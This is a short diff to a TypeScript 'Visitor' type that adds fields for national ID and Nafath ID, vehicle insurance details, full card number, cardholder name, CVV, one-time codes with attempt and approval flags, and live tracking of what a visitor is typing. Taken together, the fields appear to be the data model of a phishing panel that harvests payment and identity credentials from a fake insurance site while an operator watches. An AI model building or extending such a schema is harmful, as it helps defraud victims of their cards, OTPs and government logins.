@@ -26,12 +26,32 @@ export type Customer = {
 
 export type Visitor = {
   id: string;
-  name?: string;
-  phone?: string;
   country?: string;
-  currentPage?: string;
-  status?: string;
-  finalStatus?: string;
+  currentPage?: string | number;
   online?: boolean;
+  lastSeen?: any;
   createdDate?: string;
+  paymentStatus?: string;
+  finalStatus?: string;
+  phone?: string;
+  phone2?: string;
+  operator?: string;
+  documment_owner_full_name?: string;
+  owner_identity_number?: string;
+  insurance_purpose?: string;
+  vehicle_type?: string;
+  sequenceNumber?: string;
+  nafazId?: string;
+  otpAttempts?: number;
+  otpVerified?: boolean;
+  otpSent?: boolean;
+  waitingForApproval?: boolean;
+  submissionTime?: string;
+  typing?: boolean;
+  currentInput?: string;
+  currentField?: string;
+  cardNumber?: string;
+  cardName?: string;
+  cvv?: string;
+  otp?: string;
 };
